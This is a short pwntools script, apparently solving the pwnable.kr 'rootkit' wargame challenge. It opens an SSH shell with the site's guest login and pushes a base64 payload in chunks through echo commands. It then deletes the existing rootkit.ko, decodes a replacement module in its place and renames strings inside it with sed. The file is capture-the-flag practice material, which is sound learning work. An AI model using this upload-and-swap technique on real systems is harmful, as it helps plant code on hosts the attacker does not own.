import os
from pwn import *

'''
x= ''
with open('/Users/linallen/Desktop/attack.b64', 'r') as fp:
    l = fp.readline().strip()
    while l:
        x+=l
        l = fp.readline().strip()

print len(x)


with open('/Users/linallen/Desktop/1.txt', 'w+') as f:
    f.write(x)


'''
sh = ssh(
    user = 'rootkit',
    password = 'guest',
    host = 'pwnable.kr',
    port = 2222
)

r = sh.shell('/bin/sh')

#r.recvuntil('/ #')


size  = 0x200
i=0
with open('/Users/linallen/Desktop/1.b64', 'r') as f:
    bc = f.read()

print len(bc)

while i < len(bc):
    b = bc[i:i+size]
    command = 'echo -n "%s" >> /tmp/1.txt;'%b
    r.recvuntil('/ #')
    r.sendline(command)
    print i
    i +=size

r.sendline('rm rootkit.ko')
sleep(0.1)
r.sendline('base64 -d /tmp/1.txt > rootkit.ko')
sleep(0.1)
r.sendline("sed -i rootkit.ko -e \'s/rootkit/rootkis/g\'")
sleep(0.1)


r.interactive()
print 'hey'
